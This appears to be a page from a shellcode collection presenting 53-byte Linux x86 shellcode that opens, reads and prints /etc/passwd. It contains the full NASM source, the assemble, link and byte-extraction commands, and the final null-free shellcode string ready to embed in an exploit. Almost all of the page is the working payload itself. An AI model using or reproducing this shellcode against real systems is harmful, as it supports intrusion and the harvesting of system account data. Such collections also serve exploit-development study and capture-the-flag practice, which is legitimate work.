---
layout: default
title: read("/etc/passwd"); write(stdout) - Read /etc/passwd and write contents to stdout
permalink: /shellcode/asm-04.html
os: Linux
arch: Intel x86
length: 53
---

# {{ page.title }}

---
**OS:** {{ page.os }}

**Architecture:** {{ page.arch }}

**Length:** {{ page.length }} bytes

---

## Assembly

```nasm
section .text
global _start

_start:
	xor ecx, ecx		; null ebx (0)
	mul ecx			; eax, ebx, edx = 0

	push ecx		; push null terminator
	push 0x64777373		; push "sswd"
	push 0x61702f63		; push "c/pa"
	push 0x74652f2f		; push "//et"
	mov ebx, esp		; move pointer to "//etc/passwd" into ebx

	mov al, 0x05		; move open syscall number into al (eax)
	int 0x80		; call open

	xchg eax, ebx		; eax = "/etc/passwd" ebx = fd
	xchg eax, ecx		; eax = 0 ecx = "/etc/passwd"
	mov al, 0x03		; move read syscall num into al (eax)
	mov dx, 0xfff		; move length 4095 into dx (edx)
	int 0x80		; call read

	xchg eax, edx		; exchange eax and edx (eax: 1000, edx: 774)
	xor eax, eax		; null eax (0)
	mov al, 0x04		; move syscall num for write into al
	mov bl, 0x01		; move 1 (stdout) into bl (ebx)
	int 0x80		; call write

	xor ebx, ebx		; null ebx (0)
	mul ebx			; eax, ebx, edx = 0
	mov al, 0x01		; move 1 into al
	int 0x80		; call exit

```

## Compilation and Linking

```bash
# Assemble
nasm -f elf -o code.o code.asm

# Link
ld -m elf_i386 -o code code.o

# Extract Shellcode
printf '\\x' && objdump -d code | grep "^ " | cut -f2 | tr -d ' ' | tr -d '\n' | sed 's/.\{2\}/&\\x /g'| head -c-3 | tr -d ' ' && echo ' '
```

## Shellcode

```
\x31\xc9\xf7\xe1\x51\x68\x73\x73\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f\x65\x74\x89\xe3\xb0\x05\xcd\x80\x93\x91\xb0\x03\x66\xba\xff\x0f\xcd\x80\x92\x31\xc0\xb0\x04\xb3\x01\xcd\x80\x31\xdb\xf7\xe3\xb0\x01\xcd\x80
```